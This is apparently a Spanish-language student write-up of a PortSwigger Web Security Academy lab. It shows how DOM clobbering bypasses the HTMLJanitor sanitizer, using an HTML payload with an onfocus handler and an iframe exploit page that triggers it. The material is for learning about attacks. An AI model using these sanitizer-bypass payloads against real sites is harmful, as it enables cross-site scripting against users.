![[Pasted image 20250914215052.png]]

Se logro y si se lanzo la alerta:

![[Pasted image 20250914215127.png]]

Lab Terminado.


### Lab: Clobbering DOM attributes to bypass HTML filters

En este lab se emplea `HTMLJanitor` donde se utiliza una lista blanca que limita el html que recibe un subconjunto definido.

![[Pasted image 20250914215923.png]]
Volvemos a encontrar scripts extraños los cuales tenemos que analizar.
![[Pasted image 20250914220055.png]]
Por lo que vemos en el script, se esta usando una configuración donde solo podemos usar `input, form, i, b, p` y lo que esta activo con true se puede usar, por lo que estamos un chance jodidos.

Bueno recordando el concepto de de el DOM Clobbering recordamos que podemos jugar un poco con esto y revisando el código mas afondo de `htmlJanitor.js` para ver como se aplica nos encontramos con es:
![[Pasted image 20250914221218.png]]

Lo que intenta hacer en realidad es iterar por todos los atributos de los elementos disponibles como el input o el form. La forma en la que llama a los atributos es el problema dando que al igual que en el lab anterior lo hace de forma general provocando que mediante el Clobbering tratemos de confundirlo de la siguiente manera:
```html
  <form id=x tabindex=0 onfocus=alert(0)><input id=attibutes>
```

vamos a ver si esto funciona, el objetivo es confundir a la web para que no realize la sanitización.

![[Pasted image 20250914222115.png]]
![[Pasted image 20250914222226.png]]
Vemos que si se inserta correctamente por lo que ya estamos pasando la protección.

Con esto ya funcionando lo que vamos a hacer es crear la web maliciosa:
```html
<iframe src="https://0af8005f045cacca81049d8000dc004b.web-security-academy.net/post?postId=3"
  onload="setTimeout(()=> this.src +='#x',500)"></iframe>
```

![[Pasted image 20250914222902.png]]

Con esto se realiza correctamente la maquina:
![[Pasted image 20250914223059.png]]

Lab Terminado.